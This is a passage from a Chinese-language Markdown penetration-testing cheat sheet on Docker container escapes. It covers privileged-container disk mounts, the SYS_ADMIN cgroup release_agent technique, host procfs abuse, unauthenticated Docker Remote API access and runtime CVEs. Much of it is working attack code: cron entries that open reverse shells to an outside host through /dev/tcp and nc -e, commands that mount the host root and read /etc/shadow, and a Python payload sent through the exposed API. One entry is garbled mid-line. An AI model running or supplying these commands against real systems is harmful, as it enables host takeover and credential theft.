    ```
3. dm-0 存在于 `/dev` 目录下,新建一个目录,将 `/dev/dm-0` 挂载至新建的目录
    ```bash
    mkdir /aaa
    mount /dev/dm-0 /aaa
    ```
4. 写入计划任务到宿主机
    ```bash
    echo '* * * * * bash -i >& /dev/tcp/x.x.x.x/2100 0>&1' >> /aaa/var/spool/cron/root
    ```
**capability SYS_ADMIN**
- 相关文章
    - [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- 利用条件
    - 在容器内 root 用户
    - 容器必须使用 SYS_ADMIN Linux capability 运行
    - 容器必须缺少 AppArmor 配置文件，否则将允许 mount syscall
    - cgroup v1 虚拟文件系统必须以读写方式安装在容器内部
- 复现测试
    我们需要一个 cgroup，可以在其中写入 notify_on_release 文件(for enable cgroup notifications)，挂载 cgroup 控制器并创建子 cgroup，创建 `/bin/sh` 进程并将其 PID 写入 cgroup.procs 文件，sh 退出后执行 release_agent 文件。
1. 主机使用 SYS_ADMIN Linux capability 运行一个 docker 容器
    ```bash
    docker run -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu /bin/bash
    ```
2. 挂载 cgroup 控制器并创建子 cgroup
    ```bash
    mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
    ```
    > 注:如果这里报错"mount: /tmp/cgrp: special device cgroup does not exist.",将 rdma 改为 memory
3. 创建 `/bin/sh` 进程并将其 PID 写入 cgroup.procs 文件，sh 退出后执行 release_agent 文件。
    ```bash
    echo 1 > /tmp/cgrp/x/notify_on_release
    host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
    echo "$host_path/cmd" > /tmp/cgrp/release_agent
    cat /tmp/cgrp/release_agent
    echo '#!/bin/sh' > /cmd
    echo "ls > $host_path/output" >> /cmd
    chmod a+x /cmd
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
    head /output
    ```
**挂载宿主机 Procfs 系统导致容器逃逸**
- 漏洞描述
    procfs 是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的 procfs 挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用 root 权限，且没有开启 User Namespace 时. 有些业务为了实现某些特殊需要，会将该文件系统挂载进来
    procfs 中的 `/proc/sys/kernel/core_pattern` 负责配置进程崩溃时内存转储数据的导出方式。从 2.6.19 内核版本开始，Linux 支持在 `/proc/sys/kernel/core_pattern` 中使用新语法。如果该文件中的首个字符是管道符 `|`，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。可以利用上述机制，在挂载了宿主机 procfs 的容器内实现逃逸。
- 相关文章
    - [挂载宿主机Procfs系统导致容器逃逸](https://github.com/Metarget/metarget/tree/master/writeups_cnv/mount-host-procfs)
**Docker Remote API 未授权访问漏洞**
- 漏洞描述
    Docker Remote API 是一个取代远程命令行界面（rcli）的 REST API。存在问题的版本分别为 1.3 和 1.6 因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。
- 相关文章
    - [新姿势之Docker Remote API未授权访问漏洞分析和利用](https://wooyun.js.org/drops/%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8.html)
    - [Docker Remote API未授权访问漏洞复现](https://zgao.top/docker-remote-api%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)
    - [Docker daemon api 未授权访问漏洞](https://mp.weixin.qq.com/s/sPNEQ5n0rQEspTi7UescLg)
    - [针对暴露Docker.Sock的攻击总结](https://mp.weixin.qq.com/s/65XvaD_U3gkwzjXzrrwOpw)
- POC | Payload | exp
    - `http://[ip]:2375/version`
        ```bash
        docker -H tcp://[IP]:2375 version
        docker -H tcp://[IP]:2375 ps
        docker -H tcp://[IP] run -it --privileged=true busybox sh
        fdisk -l
        mkdir /aaa
        mount /dev/dm-0 /aaa
        或
        docker -H tcp://xx.xx.xx.xx:2375 run -it -v /:/mnt busybox sh
        cd /mnt
        ls
        或
        docker -H :2375 run --rm -it --privileged --net=host -v /:/mnt alpine
        cat /mnt/etc/shadow
        chroot /mnt
        # 拿下后直接写 crontab 即可
        ```
    - [netxfly/docker-remote-api-exp](https://github.com/netxfly/docker-remote-api-exp)
    - [Tycx2ry/docker_api_vul](https://github.com/Tycx2ry/docker_api_vul)
    - [docker daemon api 未授权访问漏洞](https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md)
        ```py
        import docker
        client = docker.DockerClient(base_url='http://your-ip:2375/')
        data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc 反弹地址 反弹端口 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
        ```
---
## 容器服务缺陷
**CVE-2019-5736 漏洞逃逸**
- 漏洞描述
    Docker、containerd 或者其他基于 runc 的容器在运行时存在安全漏洞，runC 是用于创建和运行 Docker 容器的 CLI 工具,runC 18.09.2版本前的 Docker 允许恶意容器覆盖宿主机上的 runC 二进制文件。攻击者可以通过特定的容器镜像或者 exec 操作获取到宿主机 runc 执行时的文件句柄并修改掉 runc 的二进制文件，从而获取到宿主机的 root 执行权限。
- 影响版本
    - Docker Version flag;#:"
    ```
**CVE-2019-14271 Docker cp**
- 漏洞描述
    在在与 GNU C 库（也称为 glibc）链接的 19.03.1 之前的 Docker 19.03.x 中，当 nsswitch 工具动态地在包含容器内容的 chroot 内加载库时，可能会发生代码注入。
- 影响版本
    - 19.03 <= Docker Version < 19.03.1
- 相关文章
    - [Docker Patched the Most Severe Copy Vulnerability to Date With CVE-2019-14271](https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/)
    - [CVE-2019-14271：Docker cp命令漏洞分析](https://www.anquanke.com/post/id/193218)
    - [Docker copy漏洞导致容器逃逸（CVE-2019-14271）](https://github.com/Metarget/metarget/tree/master/writeups_cnv/docker-cve-2019-14271)
**CVE-2020-15257**
- 漏洞描述
    Containerd 是一个控制 runC 的守护进程，提供命令行客户端和 API，用于在一个机器上管理容器。
    在版本 1.3.9 之前和 1.4.0~1.4.2 的 Containerd 中，由于在网络模式为 host 的情况下，容器与宿主机共享一套 Network namespace ，此时 containerd-shim API 暴露给了用户，而且访问控制仅仅验证了连接进程的有效 UID 为 0，但没有限制对抽象 Unix 域套接字的访问，刚好在默认情况下，容器内部的进程是以 root 用户启动的。在两者的共同作用下，容器内部的进程就可以像主机中的 containerd 一样，连接 containerd-shim 监听的抽象 Unix 域套接字，调用 containerd-shim 提供的各种 API，从而实现容器逃逸。
- 相关文章
    - [Containerd漏洞导致容器逃逸（CVE-2020-15257）](https://github.com/Metarget/metarget/tree/master/writeups_cnv/docker-containerd-cve-2020-15257)
    - [CVE-2020-15257：Containerd虚拟环境逃逸复现](https://mp.weixin.qq.com/s/tyxJhqcZ3QTSjAqTZZSgrA)
## 更多内容
- [镜像仓库安全](../../../../Integrated/容器/Docker.md#镜像仓库安全)
- [镜像安全扫描](../../../../Integrated/容器/Docker.md#镜像安全扫描)
- [容器逆向分析](../../../../Integrated/容器/Docker.md#容器逆向分析)
- [容器运行时监控](../../../../Integrated/容器/Docker.md#容器运行时监控)
- [容器安全审计](../../../../Integrated/容器/Docker.md#容器安全审计)